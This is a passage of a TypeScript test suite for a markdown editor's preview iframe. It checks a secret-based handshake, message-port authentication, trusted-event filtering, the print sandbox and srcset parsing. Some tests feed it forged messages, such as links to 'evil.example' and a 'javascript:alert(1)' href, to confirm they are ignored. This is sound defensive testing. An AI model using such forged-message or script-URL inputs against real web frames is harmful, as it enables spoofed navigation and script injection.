    expect(bridgeAt).toBeLessThan(full.indexOf('id="orz-doc"'));
    for (const hook of ['__orzPreviewApply', '__orzPreviewNavigate', '__orzPreviewMessage', 'pin("__orzPreview",FZ({report:FZ(report),post:FZ(post),navigated:FZ(navigated),assets:FZ(swap)}))']) expect(PREVIEW_BRIDGE).toContain(hook);
    const custom = previewFrameDocument({ assets: false, bridge: 'void 0', head: '<link rel="stylesheet" href="t.css">' });
    expect(custom.indexOf('<script>void 0</script>')).toBeGreaterThan(custom.indexOf('id="orz-doc"'));
    // the frame's secret rides on the bridge's own <script> (its text, and so its hash, stays the same), first in <head>, nonce-stamped
    const signed = previewFrameDocument({ secret: 's3"cret', nonce: 'n0nce', head: '<link rel="stylesheet" href="t.css">' });
    expect(signed).toContain(`<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><script nonce="n0nce" ${PREVIEW_SECRET_ATTRIBUTE}="s3&quot;cret">${PREVIEW_BRIDGE}</script>`);
    for (const t of signed.match(/<(script|link)\b[^>]*>/g)!) expect(t).toContain('nonce="n0nce"');
    // a carrier's own bridge gets it too (frameDocument places parts.bridge), so it can do the same handshake
    expect(previewFrameParts({ bridge: 'void 0', secret: 'k' }).bridge).toBe(`<script ${PREVIEW_SECRET_ATTRIBUTE}="k">void 0</script>`);
    expect(previewFrameParts({}).bridge).toBe(`<script>${PREVIEW_BRIDGE}</script>`);
  });

  it('[E.25] __orzPreviewApply calls never overlap: a render that arrives while the last one\'s promise is pending waits, only the latest runs after it, and each is acknowledged when it settles', async () => {
    // the bridge, run in a bare vm context: enough DOM for the page hook path
    const posted: Array<Record<string, unknown>> = [];
    const listeners: Record<string, Array<(e: unknown) => void>> = {};
    const applied: string[] = [];
    const settle: Array<() => void> = [];
    const win: Record<string, unknown> = {
      setTimeout, clearTimeout, Reflect, Uint32Array, Array, Math, Date, String, isFinite, isNaN, parseInt,
      __orzPreviewApply: (html: string) => { applied.push(html); return new Promise<void>((r) => settle.push(r)); },
      ...bridgeDomStubs((t, l) => { (listeners[t] ??= []).push(l); }),
    };
    win.window = win;
    win.parent = { postMessage: (m: Record<string, unknown>) => posted.push(m) };
    win.document = {
      currentScript: null, documentElement: { getAttribute: () => null }, scrollingElement: { scrollTop: 0, scrollHeight: 0 },
      addEventListener: () => {}, getElementById: () => null,
    };
    win.requestAnimationFrame = (f: () => void) => setTimeout(f, 0);
    vm.runInNewContext(PREVIEW_BRIDGE, win);
    expect(posted[0]).toEqual({ type: 'orz-preview-ready' }); // no secret on its script: a plain ready
    const MessageEvent = win.MessageEvent as new (init: Record<string, unknown>) => unknown;
    const fromShell = (d: unknown) => { for (const l of listeners.message ?? []) l(new MessageEvent({ data: d, source: win.parent })); };
    fromShell({ type: 'orz-preview-render', id: 1, html: 'one' });
    fromShell({ type: 'orz-preview-render', id: 2, html: 'two' });
    fromShell({ type: 'orz-preview-render', id: 3, html: 'three' });
    await tick(5); // (2.3.0 round 4: a message is handled after its dispatch)
    expect(applied).toEqual(['one']);
    settle[0]();
    await tick(5);
    expect(applied).toEqual(['one', 'three']);
    expect(posted.filter((m) => m.type === 'orz-preview-rendered')).toEqual([]);
    settle[1]();
    await tick(5);
    expect(posted.filter((m) => m.type === 'orz-preview-rendered').map((m) => m.id)).toEqual([3]);
  });
});

describe('the authenticated preview channel (option B: the frame secret)', () => {
  /** A fake window with MessageChannel: every port the shell makes, and what goes through it. */
  function portPage() {
    const f = fakePreviewPage();
    type FakePort = { onmessage: ((e: { data: unknown }) => void) | null; sent: unknown[]; closed: boolean; postMessage(m: unknown): void; close(): void };
    const ports: FakePort[] = [];
    (f.doc.defaultView as unknown as Record<string, unknown>).MessageChannel = class {
      port1: FakePort;
      port2 = { onmessage: null };
      constructor() {
        this.port1 = { onmessage: null, sent: [], closed: false, postMessage(m: unknown) { this.sent.push(m); }, close() { this.closed = true; } };
        ports.push(this.port1);
      }
    };
    const transfers: unknown[] = [];
    f.frameWindow.postMessage = (m: unknown, _o?: unknown, t?: unknown[]) => { f.posted.push(m); if (t) transfers.push(...t); };
    const fromBridge = (data: unknown, i = ports.length - 1) => ports[i].onmessage?.({ data });
    const load = () => (f.iframe.on as Record<string, (e: unknown) => void>).load?.({});
    return { ...f, ports, transfers, fromBridge, load };
  }

  it('[E.5] [E.14] the port goes only to a ready with this frame\'s secret: a forged ready — without a channel, with a channel and no or a wrong secret, or a second one before the frame loads again — is ignored and the real port stays open; a reload of the document (its load event) may take a new port, retiring the old one; a new frame document (setOptions) has a new secret', () => {
    const f = portPage();
    const seen: unknown[] = [];
    let readies = 0;
    const p = createPreview(f.doc, f.parent, { assets: false }, {
      onKey: (k) => seen.push(['key', k]), onLink: (h) => seen.push(['link', h]), onActive: (i) => seen.push(['active', i]), onScrolled: (t) => seen.push(['scrolled', t]), onReady: () => readies++,
    });
    const secret = secretOf(f.iframe as { srcdoc: string });
    expect(secret).toMatch(/^[0-9a-z]+(-[0-9a-z]+){3}$/);
    expect(String(f.iframe.srcdoc)).toContain(`<script ${PREVIEW_SECRET_ATTRIBUTE}="${secret}">${PREVIEW_BRIDGE}</script>`);
    // the bridge reads it from its own <script> and removes it first thing, then says ready with it
    expect(PREVIEW_BRIDGE.indexOf('sec=me.getAttribute("data-orz-preview-secret");me.removeAttribute("data-orz-preview-secret")')).toBeLessThan(PREVIEW_BRIDGE.indexOf('on(W,'));
    expect(PREVIEW_BRIDGE).toContain('post(sec?{type:"orz-preview-ready",channel:chan,secret:sec}:{type:"orz-preview-ready"});sec=null;');
    expect(PREVIEW_SECRET_ATTRIBUTE).toBe('data-orz-preview-secret');
    p.render('<p>one</p>');
    for (const forged of [{ channel: 'tok' }, { channel: 'tok', secret: 'guess' }, { channel: '', secret }, { channel: 'tok', secret: secret.toUpperCase() }]) f.emit({ type: 'orz-preview-ready', ...forged }, f.frameWindow);
    f.emit({ type: 'orz-preview-ready', channel: 'tok', secret }, { postMessage() {} }); // the right secret from another window
    expect([f.posted, f.transfers.length, p.ready, readies]).toEqual([[], 0, false, 0]);
    f.emit({ type: 'orz-preview-ready', channel: 'tok', secret }, f.frameWindow);
    expect(f.posted).toEqual([{ type: 'orz-preview-port', channel: 'tok' }]);
    expect([f.transfers.length, f.ports.length, p.authenticated, p.ready, readies]).toEqual([1, 1, true, true, 1]);
    expect(f.ports[0].sent).toEqual([{ type: 'orz-preview-render', id: 1, html: '<p>one</p>' }]);
    // a replaced document's readies (document.open, a navigation, a meta refresh) and a second one of the same document: ignored
    f.emit({ type: 'orz-preview-ready' }, f.frameWindow);
    f.emit({ type: 'orz-preview-ready', channel: 'x' }, f.frameWindow);
    f.emit({ type: 'orz-preview-ready', channel: 'x', secret: 'nope' }, f.frameWindow);
    f.emit({ type: 'orz-preview-ready', channel: 'x', secret }, f.frameWindow);
    expect([f.posted.length, f.ports.length, f.ports[0].closed, f.ports[0].onmessage !== null, f.ports[0].sent.length, readies]).toEqual([1, 1, false, true, 1, 1]);
    // window messages of the bridge's types never act
    f.emit({ type: 'orz-preview-key', key: 's' }, f.frameWindow);
    f.emit({ type: 'orz-preview-link', href: 'https://evil.example/' }, f.frameWindow);
    f.emit({ type: 'orz-preview-active', input: 'pointer' }, f.frameWindow);
    f.emit({ type: 'orz-preview-scrolled', top: 9, max: 10 }, f.frameWindow);
    expect(seen).toEqual([]);
    // the bridge's own reports through the port act
    f.fromBridge({ type: 'orz-preview-key', key: 's' });
    f.fromBridge({ type: 'orz-preview-link', href: 'https://example.org/' });
    f.fromBridge({ type: 'orz-preview-active', input: 'pointer' });
    f.fromBridge({ type: 'orz-preview-scrolled', top: 40, max: 100 });
    expect(seen).toEqual([['key', 's'], ['link', 'https://example.org/'], ['active', 'pointer'], ['scrolled', 40]]);
    p.scrollTo(40);
    expect(f.ports[0].sent.at(-1)).toEqual({ type: 'orz-preview-scroll', top: 40 });
    // the same document loaded again (a moved iframe, location.reload()): its bridge, first again, may take a new port
    f.load();
    f.emit({ type: 'orz-preview-ready', channel: 'tok2', secret }, f.frameWindow);
    expect([f.ports.length, f.posted.at(-1), (f.ports[1].sent[0] as Record<string, unknown>).html]).toEqual([2, { type: 'orz-preview-port', channel: 'tok2' }, '<p>one</p>']);
    // a new frame document: a new secret; the old one gets nothing
    p.setOptions({ scheme: 'dark' });
    const next = secretOf(f.iframe as { srcdoc: string });
    expect(next).not.toBe(secret);
    f.emit({ type: 'orz-preview-ready', channel: 'tok3', secret }, f.frameWindow);
    expect([f.ports.length, p.ready]).toEqual([2, false]);
    f.emit({ type: 'orz-preview-ready', channel: 'tok3', secret: next }, f.frameWindow);
    expect([f.ports.length, p.ready]).toEqual([3, true]);
    p.destroy();
    expect(f.ports.every((x) => x.closed)).toBe(true);
    expect(f.iframe.on).toEqual({});
  });

  it('[E.5] a bridge without the port (a plain ready) gets renders through the window and its render acknowledgements pace them; its keys, links, input and scrolls never act, and shell.preview.on hears only a carrier\'s own types from the window', async () => {
    const g = fakePreviewPage();
    const seen: unknown[] = [];
    const heard: unknown[] = [];
    const q = createPreview(g.doc, g.parent, { assets: false }, { onKey: (k) => seen.push(k), onLink: (h) => seen.push(h), onActive: (i) => seen.push(i), onScrolled: (t) => seen.push(t) });
    q.on('orz-preview-key', (m) => heard.push(m.type));
    q.on('x-mine', (m) => heard.push(m.type));
    g.emit({ type: 'orz-preview-ready' }, g.frameWindow);
    const acked = q.render('<p>a</p>');
    expect(g.posted).toEqual([{ type: 'orz-preview-render', id: 1, html: '<p>a</p>' }]);
    g.emit({ type: 'orz-preview-rendered', id: 1, anchors: [[0, 0]], max: 5 }, g.frameWindow);
    expect(await acked).toBe(true);
    g.emit({ type: 'orz-preview-key', key: 's' }, g.frameWindow);
    g.emit({ type: 'orz-preview-link', href: 'https://evil.example/' }, g.frameWindow);
    g.emit({ type: 'orz-preview-active', input: 'key' }, g.frameWindow);
    g.emit({ type: 'orz-preview-scrolled', top: 3, max: 5 }, g.frameWindow);
    g.emit({ type: 'x-mine' }, g.frameWindow);
    expect([q.authenticated, seen, heard]).toEqual([false, [], ['x-mine']]);
    q.destroy();
  });

  it('[E.5] the bridge takes the port in a capture listener registered first and hides it from the frame\'s other listeners, sends through Reflect.apply and MessagePort.prototype.postMessage as they were when it started, and reports keys, links, input and scrolls only for trusted events (scrolls and navigated lines only within 1.5 s of the reader\'s own input); it has no focus report', () => {
    expect(() => new vm.Script(PREVIEW_BRIDGE)).not.toThrow(); // it parses (a syntax slip leaves the preview blank)
    expect(PREVIEW_BRIDGE.startsWith('(function(){"use strict";')).toBe(true); // strict: no fn.caller / fn.arguments walk into the bridge (2.3.0 round 3, E.35)
    expect(PREVIEW_BRIDGE.indexOf('on(W,"message"')).toBeLessThan(PREVIEW_BRIDGE.indexOf('function active'));
    expect(PREVIEW_BRIDGE).toContain('C(SIP,e);if(!port&&d.channel===chan)');
    expect(PREVIEW_BRIDGE).toContain('var RA=Reflect.apply,GOD=Object.getOwnPropertyDescriptor');
    expect(PREVIEW_BRIDGE).toContain('PM=G(MP,"postMessage")');
    expect(PREVIEW_BRIDGE).toContain('function send(m){if(port&&PM){try{C(PM,port,[m])}catch(e){}}}'); // never the window
    for (const guard of [
      'if(tr(e))active("pointer")', 'if(tr(e)&&C(BTN,e))lastIn=NOW()', 'on(D,"keydown",function(e){if(!tr(e))return;',
      'if(tr(e))send({type:"orz-preview-link"', 'if(!tr(e)||NOW()<mute||NOW()-lastIn>1500||queued)return;', 'NOW()-lastIn<1500)send({type:"orz-preview-scrolled",line:l})',
    ]) expect(PREVIEW_BRIDGE).toContain(guard);
    for (const gone of ['orz-preview-focus', 'orz-preview-ping', 'orz-preview-pong', 'hasFocus']) expect(PREVIEW_BRIDGE).not.toContain(gone);
    expect(PREVIEW_BRIDGE).toContain('pin("__orzPreview",FZ({report:FZ(report),post:FZ(post),navigated:FZ(navigated),assets:FZ(swap)}))'); // post: a window message, never the port
  });

  it('[E.35] (2.3.0 round 4) the default bridge, run in a bare vm: a handover without its channel is not taken; the port\'s message is handled after its listener returns (never inside the dispatch, where window.event is the port\'s event), as is a window message before the port, and after it window messages do nothing; untrusted key, pointer, wheel, touch and click events report nothing and __orzPreview.navigated reports nothing without the reader\'s input — trusted ones do; __orzPreview (and its functions) and __orzLibsReady are frozen, non-writable, non-configurable window properties', async () => {
    type L = { t: string; l: (e: unknown) => void; on: unknown };
    const ls: L[] = [];
    const ready: Array<Record<string, unknown>> = [];
    const sent: Array<Record<string, unknown>> = [];
    const scroller = { scrollTop: 0, scrollHeight: 100 };
    const stubs = bridgeDomStubs((t, l, on) => { ls.push({ t, l, on }); });
    const EventTargetC = stubs.EventTarget as new () => object;
    class MessagePort extends EventTargetC { postMessage(m: Record<string, unknown>) { sent.push(m); } start() {} }
    class Element { _h: string; constructor(h = '') { this._h = h; } closest() { return this._h ? this : null; } getAttribute() { return this._h; } }
    const win: Record<string, unknown> = {
      setTimeout, clearTimeout, Reflect, Uint32Array, Array, Math, Date, String, Object, isFinite, isNaN, parseInt, crypto: globalThis.crypto,
      ...stubs, MessagePort, Element, innerHeight: 50,
    };
    win.window = win;
    win.parent = { postMessage: (m: Record<string, unknown>) => ready.push(m) };
    win.document = {
      currentScript: { getAttribute: () => 'sekret', removeAttribute: () => {} }, documentElement: { getAttribute: () => null }, scrollingElement: scroller,
      getElementById: () => null,
    };
    win.requestAnimationFrame = (f: () => void) => setTimeout(f, 0);
    vm.runInNewContext(PREVIEW_BRIDGE, win);
    expect(ready[0]).toMatchObject({ type: 'orz-preview-ready', secret: 'sekret' });
    const E = win as unknown as Record<string, new (i: Record<string, unknown>) => unknown>;
    /** Dispatch to the bridge's listeners on `on` (the window: neither the port nor the document — inside the vm the window is the context's global proxy). */
    const fire = (t: string, e: unknown, on: unknown) => { for (const x of ls) if (x.t === t && (on === win ? x.on !== port && x.on !== win.document : x.on === on)) x.l(e); };
    const port = new MessagePort();
    // before the port, the parent's window message: also handled after the dispatch
    fire('message', new E.MessageEvent({ data: { type: 'orz-preview-scroll', top: 10 }, source: win.parent, trusted: true }), win);
    expect(scroller.scrollTop).toBe(0);
    await tick(5);
    expect(scroller.scrollTop).toBe(10);
    // a handover without this bridge's channel is not taken (K09)
    const decoy = new MessagePort();
    fire('message', new E.MessageEvent({ data: { type: 'orz-preview-port', channel: 'guess' }, ports: [decoy], source: win.parent, trusted: true }), win);
    expect(ls.some((x) => x.on === decoy)).toBe(false);
    fire('message', new E.MessageEvent({ data: { type: 'orz-preview-port', channel: ready[0].channel }, ports: [port], source: win.parent, trusted: true }), win);
    expect(ls.some((x) => x.on === port && x.t === 'message')).toBe(true);
    // the port's message: nothing happens inside the listener — the bridge handles it after the dispatch
    fire('message', new E.MessageEvent({ data: { type: 'orz-preview-scroll', top: 30 }, trusted: true }), port);
    expect(scroller.scrollTop).toBe(10);
    await tick(5);
    expect(scroller.scrollTop).toBe(30);
    // once it holds the port, the window's messages do nothing (K04)
    fire('message', new E.MessageEvent({ data: { type: 'orz-preview-scroll', top: 99 }, source: win.parent, trusted: true }), win);
    await tick(5);
    expect(scroller.scrollTop).toBe(30);
    // untrusted (script-dispatched) input: nothing reported; navigated without the reader's input: nothing
    const doc = win.document;
    fire('keydown', new E.KeyboardEvent({ key: 's', metaKey: true, trusted: false }), doc);
    fire('keydown', new E.KeyboardEvent({ key: 'Escape', trusted: false }), doc);
    for (const t of ['pointerdown', 'wheel', 'touchstart']) fire(t, new E.MouseEvent({ trusted: false }), win);
    fire('pointermove', new E.MouseEvent({ buttons: 1, trusted: false }), win);
    fire('click', new E.MouseEvent({ target: new Element('https://evil.example/'), trusted: false }), doc);
    const api = win.__orzPreview as { navigated(l: number): void; report(): void };
    api.navigated(40);
    await tick(5);
    expect(sent).toEqual([]);
    // the reader's own (trusted) input does report, and opens the navigated window
    fire('keydown', new E.KeyboardEvent({ key: 's', metaKey: true, trusted: true }), doc);
    fire('click', new E.MouseEvent({ target: new Element('https://ok.example/'), trusted: true }), doc);
    api.navigated(40);
    expect(sent.map((m) => `${m.type}:${m.key ?? m.href ?? m.input ?? m.line ?? ''}`)).toEqual(['orz-preview-active:key', 'orz-preview-key:s', 'orz-preview-link:https://ok.example/', 'orz-preview-scrolled:40']);
    // what the bridge exposes cannot be replaced
    for (const n of ['__orzPreview', '__orzLibsReady']) {
      const d = Object.getOwnPropertyDescriptor(win, n)!;
      expect([n, d.writable, d.configurable, Object.isFrozen(d.value)]).toEqual([n, false, false, true]);
    }
    for (const f of ['report', 'post', 'navigated'] as const) expect(Object.isFrozen((api as unknown as Record<string, unknown>)[f])).toBe(true);
    expect(() => { 'use strict'; (win as Record<string, unknown>).__orzPreview = {}; }).toThrow(TypeError);
    expect(win.__orzPreview).toBe(api);
  });

  it('[E.14] focus entering the preview frame — a document script\'s focus(), or the reader\'s click — moves nothing: the shell does not take it back, replaces no frame, shows no note and emits no error, and a Tab, a window blur and focus round trip leave the preview as it was', async () => {
    const m = mount();
    const errors: string[] = [];
    m.shell.on('error', (e) => errors.push(e.message));
    const f = authFrameOf(m);
    const first = m.root.querySelector('iframe')!;
    m.ta().focus();
    f.iframe.focus();
    m.win.dispatchEvent(new m.win.Event('blur') as unknown as Event);
    m.win.dispatchEvent(new m.win.Event('focus') as unknown as Event);
    key(m, m.ta(), 'Tab');
    await tick(1700);
    expect([m.root.activeElement === f.iframe, m.root.querySelector('iframe') === first, first.srcdoc.includes('Content-Security-Policy'), m.root.querySelector('[data-orz-paused]'), errors, f.port.closed]).toEqual([true, true, false, null, [], false]);
    expect(f.sent.filter((x) => x.type === 'orz-preview-ping')).toEqual([]);
    m.shell.destroy();
  });

  it('[E.14] a wheel on the editor counts as the reader touching it although the editor has no focus: the frame\'s "active" and scroll reports within 300 ms do not move it', async () => {
    const engine = textareaAdapter();
    const scrollTo = vi.spyOn(engine, 'scrollTo');
    const m = mount({ adapter: engine });
    const f = authFrameOf(m);
    m.ta().blur();
    await tick(350);
    m.ta().dispatchEvent(new m.win.WheelEvent('wheel', { bubbles: true, deltaY: 40 }) as unknown as Event);
    f.bridge({ type: 'orz-preview-active' });
    f.bridge({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
    await tick(100);
    f.bridge({ type: 'orz-preview-active' });
    f.bridge({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
    expect(scrollTo).not.toHaveBeenCalled();
    await tick(300); // the wheel is 400 ms old: the preview may lead again
    f.bridge({ type: 'orz-preview-active' });
    f.bridge({ type: 'orz-preview-scrolled', top: 0, max: 1000 });
    expect(scrollTo).toHaveBeenCalled();
    m.shell.destroy();
  });

  it('[E.14] a link from the frame never opens a window by itself: without onLink the shell offers it in a chip ("Open <host>?") and opens it only when the reader clicks Open', async () => {
    const opened: string[] = [];
    const m = mount();
    (m.win as unknown as { open: unknown }).open = (u: string) => { opened.push(u); return null; };
    const f = authFrameOf(m);
    f.say({ type: 'orz-preview-link', href: 'https://evil.example/forged' }); // on the window: nothing, not even a chip
    expect(m.root.querySelector('.orz-editor__link-chip')).toBeNull();
    f.bridge({ type: 'orz-preview-link', href: 'https://example.org/page' });
    f.bridge({ type: 'orz-preview-link', href: 'javascript:alert(1)' });
    expect(opened).toEqual([]);
    const chip = m.root.querySelector('.orz-editor__link-chip')!;
    expect(chip.textContent).toContain('Open example.org?');
    expect(chip.getAttribute('data-orz-link')).toBe('https://example.org/page');
    (chip.querySelector('button') as HTMLButtonElement).click();
    expect(opened).toEqual(['https://example.org/page']);
    expect(m.root.querySelector('.orz-editor__link-chip')).toBeNull();
    m.shell.destroy();
  });
});

describe('printDocument (2.3.0, round 3 of the paged loop)', () => {
  it('[E.37] the print frame\'s script goes at the end of the document\'s <body> (or at the end), carries the nonce when given, parses, is script-safe and calls the frame\'s own print() after __orzPrintReady; the frame is sandboxed allow-scripts allow-modals, and without a page printDocument resolves false', async () => {
    expect(PRINT_SANDBOX).toBe('allow-scripts allow-modals');
    expect(PRINT_SANDBOX).not.toContain('allow-same-origin');
    expect(PRINT_READY_TIMEOUT_MS).toBe(30_000);
    const sc = printScript('t-1', 500);
    expect(() => new vm.Script(sc)).not.toThrow();
    expect(isScriptSafe(sc)).toBe(true);
    for (const part of ['W.__orzPrintReady', 'W.print()', 'say("orz-print-start")', 'say("orz-print-done")', 'setTimeout(fire,500)']) expect(sc).toContain(part);
    expect(withPrintScript('<html><body><p>x</p></BODY></html>', 't', 1, 'n"1')).toBe(`<html><body><p>x</p><script nonce="n&quot;1">${printScript('t', 1)}</script></BODY></html>`);
    expect(withPrintScript('<p>x</p>', 't', 1)).toBe(`<p>x</p><script>${printScript('t', 1)}</script>`);
    expect(await printDocument('<p>x</p>', { document: { defaultView: null, body: null, head: null, createElement: () => { throw new Error('no'); }, createTextNode: () => ({ data: '' }) } as unknown as EdDocument })).toBe(false);
  });
});

describe('Cmd/Ctrl+P and the first acknowledgement (2.3.0, round 2 of the paged loop)', () => {
  it('[E.33] Cmd/Ctrl+P from the preview frame is a key report through the authenticated port: with a print listener the shell emits print { source: "preview" } and never prints; without one it prints the host page once; the same report on the window does nothing; in the shell Cmd/Ctrl+P emits print { source: "editor" } (default prevented) only with a listener, else it is the browser\'s', () => {
    const m = mount();
    const f = authFrameOf(m);
    const printed: string[] = [];
    (m.win as unknown as { print(): void }).print = () => { printed.push('host'); };
    // no listener: a key from the frame prints the host page (the frame prevented its own print)
    f.bridge({ type: 'orz-preview-key', key: 'p' });
    expect(printed).toEqual(['host']);
    // the same on the window (a document script's) does nothing
    f.say({ type: 'orz-preview-key', key: 'p' });
    expect(printed).toEqual(['host']);
    // in the shell without a listener: the browser's own print (not prevented, not called)
    const plain = key(m, m.ta(), 'p', { meta: true });
    expect(plain.defaultPrevented).toBe(false);
    expect(printed).toEqual(['host']);
    // with a listener: the listener decides
    const events: string[] = [];
    const off = m.shell.on('print', (e) => { events.push(e.source); });
    f.bridge({ type: 'orz-preview-key', key: 'p' });
    f.say({ type: 'orz-preview-key', key: 'p' });
    const taken = key(m, m.ta(), 'P', { ctrl: true });
    expect(taken.defaultPrevented).toBe(true);
    expect(key(m, m.ta(), 'p', { meta: true, shift: true }).defaultPrevented).toBe(false); // Shift+P is not print
    expect(events).toEqual(['preview', 'editor']);
    expect(printed).toEqual(['host']);
    off();
    // the bridge reports the key (default prevented in the frame) only for a trusted event
    expect(PREVIEW_BRIDGE).toContain('(k==="p"||k==="P")){C(PD,e);send({type:"orz-preview-key",key:"p"})}');
    expect(PREVIEW_BRIDGE).toMatch(/on\(D,"keydown",function\(e\)\{if\(!tr\(e\)\)return;/);
    m.shell.destroy();
  });

  it('[E.34] a first acknowledgement later than the first wait still records the render\'s time (a frame taking 2 s: the next pause is about 4 s, not debounceMs); preview.firstAckWaitMs lets a kind wait that long for the first one (no second render sent into the frame before the acknowledgement)', async () => {
    const run = async (preview: Record<string, unknown>): Promise<{ sentAt: number[]; t0: number; m: Mounted; f: ReturnType<typeof frameOf> }> => {
      const m = mount({ render: (t) => `<p>${t.length}</p>`, preview: { assets: false, debounceMs: 10, ...preview } });
      const f = frameOf(m);
      const sentAt: number[] = [];
      const t0 = Date.now();
      const cw = m.root.querySelector('iframe')!.contentWindow as unknown as { postMessage(x: Record<string, unknown>): void };
      cw.postMessage = (msg: Record<string, unknown>) => {
        if (msg.type !== 'orz-preview-render') return;
        sentAt.push(Date.now() - t0);
        setTimeout(() => f.say({ type: 'orz-preview-rendered', id: msg.id, anchors: [], max: 0 }), 2000);
      };
      return { sentAt, t0, m, f };
    };
    // the first acknowledgement arrives after the 1.5 s wait: its time is recorded
    {
      const { sentAt, m, f } = await run({});
      f.say({ type: 'orz-preview-ready' });
      await tick(2300); // the first render: waited 1.5 s, acknowledged at 2 s
      expect(sentAt.length).toBe(1);
      type(m, 'a');
      await tick(1500);
      expect(sentAt.length).toBe(1); // the pause counts the 2 s render (without it: rendered after 10 ms)
      await tick(3000);
      expect(sentAt.length).toBe(2);
      m.shell.destroy();
    }
    // firstAckWaitMs: a key while the first render is in the frame sends nothing until it is acknowledged (default: after 1.5 s)
    for (const [preview, more] of [[{ firstAckWaitMs: 5000 }, 0], [{}, 1]] as const) {
      const { sentAt, m, f } = await run(preview);
      f.say({ type: 'orz-preview-ready' });
      await tick(100);
      type(m, 'a');
      await tick(1750); // past the default 1.5 s wait, before the 2 s acknowledgement
      expect(sentAt.length - 1).toBe(more);
      m.shell.destroy();
    }
  }, 20_000);
});

describe('sandbox, srcset, links and includes (round 2: F6, F5, B#12, B#13, B#14)', () => {
  it('[E.20] standalone needs a top-level window and no host: a connected or framed file: page keeps the opaque frame; the standalone option wins over the inference but allow-same-origin still needs file:, top level and no host', () => {
    expect(previewSandbox({ host: 'standalone', protocol: 'file:', topLevel: false })).toBe('allow-scripts');
    expect(previewSandbox({ host: 'standalone', protocol: 'file:', connected: true })).toBe('allow-scripts');
    expect(previewSandbox({ host: 'standalone', protocol: 'file:', topLevel: true, connected: false })).toBe('allow-scripts allow-same-origin');
    const sandboxOf = (url: string, opts: Partial<EditorShellOptions>, framed = false) => {
      const win = new HappyWindow({ url });
      if (framed) Object.defineProperty(win, 'top', { value: {}, configurable: true });
      const div = win.document.createElement('div');
      win.document.body.appendChild(div);
      const s = createEditorShell(div as unknown as EdElement, { text: '# x', render: () => '', adapter: textareaAdapter(), preview: { assets: false }, ...opts });
      const v = (s.root as unknown as ShadowRoot).querySelector('iframe')!.getAttribute('sandbox');
      s.destroy();
      return v;
    };
    const file = 'file:///Users/me/doc.md.html';
    const host = { connected: () => true, setDirty() {} } as unknown as HostConnection;
    expect(sandboxOf(file, { assemble: (t) => t })).toBe('allow-scripts allow-same-origin');
    expect(sandboxOf(file, { assemble: (t) => t, host })).toBe('allow-scripts'); // R5 of round 2
    expect(sandboxOf(file, { assemble: (t) => t }, true)).toBe('allow-scripts'); // framed
    expect(sandboxOf(file, { standalone: true, hooks: { save: async () => undefined } })).toBe('allow-scripts allow-same-origin');
    expect(sandboxOf(file, { standalone: true, host })).toBe('allow-scripts');
    expect(sandboxOf(file, { standalone: true }, true)).toBe('allow-scripts');
    expect(sandboxOf(file, { standalone: false, assemble: (t) => t })).toBe('allow-scripts');
    expect(sandboxOf('https://x.example/doc.md.html', { standalone: true })).toBe('allow-scripts');
  });

  it('[E.18] srcset is read as the HTML standard reads it: a URL runs to whitespace (commas inside it, as in data: URLs, are part of it), trailing commas end a candidate, descriptors run to a comma outside parentheses', () => {
    const r = (p: string) => `blob:app/${p}`;
    expect(rewriteAssetUrls('<img srcset="data:image/png;base64,iVBORw0KGgo= 1x, b.png 2x">', r)).toBe('<img srcset="data:image/png;base64,iVBORw0KGgo= 1x, blob:app/b.png 2x">');
    expect(rewriteAssetUrls('<img srcset="a,b.png 1x">', r)).toBe('<img srcset="blob:app/a,b.png 1x">');
    expect(rewriteAssetUrls('<img srcset="a.png,b.png 2x">', r)).toBe('<img srcset="blob:app/a.png,b.png 2x">'); // one URL: no space before the comma's next URL
    expect(rewriteAssetUrls('<img srcset="a.png, b.png 2x">', r)).toBe('<img srcset="blob:app/a.png, blob:app/b.png 2x">');
    expect(rewriteAssetUrls('<img srcset="a.png,, b.png 2x,c.png">', r)).toBe('<img srcset="blob:app/a.png,, blob:app/b.png 2x,blob:app/c.png">');
    expect(mapSrcset('  x.png 100w (junk, more) , y.png', (u) => `[${u}]`)).toBe('  [x.png] 100w (junk, more) , [y.png]');
  });

  it('[E.12] with hooks.resolveLink the shell asks for links as written (ctx.twinLinks false): renderMarkdownPreview passed as render keeps x.md, and resolveLink gets the source href', async () => {
    const md2 = 'See [w2](week2.md).\n';
    expect(renderMarkdownPreview(md2)).toContain('href="week2.md.html"');
    expect(renderMarkdownPreview(md2, { twinLinks: false })).toContain('href="week2.md"');
    const ctxs: RenderContext[] = [];
    const m = mount({ text: md2, render: (t, ctx) => { ctxs.push(ctx); return renderMarkdownPreview(t, ctx); }, hooks: { resolveLink: (h) => h } });
    const f = frameOf(m);
    f.say({ type: 'orz-preview-ready' });
    await tick(30);
    expect(ctxs[0].twinLinks).toBe(false);
    expect(String(f.posted.find((x) => x.type === 'orz-preview-render')!.html)).toContain('href="week2.md"');
    m.shell.destroy();
    const plain = mount({ text: md2, render: (t, ctx) => { ctxs.push(ctx); return renderMarkdownPreview(t, ctx); } });
    await tick(30);
    expect(ctxs.at(-1)!.twinLinks).toBeUndefined();
    plain.shell.destroy();
  });

  it('[E.49] (2.5.0, FC-19 §3) the twinLinks option: the preview renders twin links with the host\'s names (render gets ctx.twinLinks = the normalized naming; the family naming is none), hooks.resolveLink still wins (links as written), and a standalone save passes { twinLinks } to assemble (with the includes)', async () => {
    const text = 'See [w2](week2.slides.md#s) and [n](notes.md).\n';
    const naming = { slides: '{stem}.deck.html', md: '{stem}.html', paged: '{stem}.paged.html' };
    const ctxs: RenderContext[] = [];
    const assembled: unknown[] = [];
    const saver = fakeSaver({ via: 'file', ok: true });
    const m = mount({
      text, twinLinks: naming, includes: { 'a.md': 'A' }, saver: saver.saver,
      assemble: (t, o) => { assembled.push(o); return `<html>${t}</html>`; },
      render: (t, ctx) => { ctxs.push(ctx); return renderMarkdownPreview(t, ctx); },
    });
    const f = frameOf(m);
    f.say({ type: 'orz-preview-ready' });
    await tick(30);
    expect(ctxs[0].twinLinks).toEqual({ md: '{stem}.html', slides: '{stem}.deck.html' });
    const html = String(f.posted.find((x) => x.type === 'orz-preview-render')!.html);
    expect(html).toContain('href="week2.deck.html#s"');
    expect(html).toContain('href="notes.html"');
    expect(html.replace(/ data-src-line="\d+"/g, '')).toBe(md.render(text, { orzTwinLinks: naming }));
    type(m, 'x');
    expect(await m.shell.save()).toMatchObject({ ok: true });
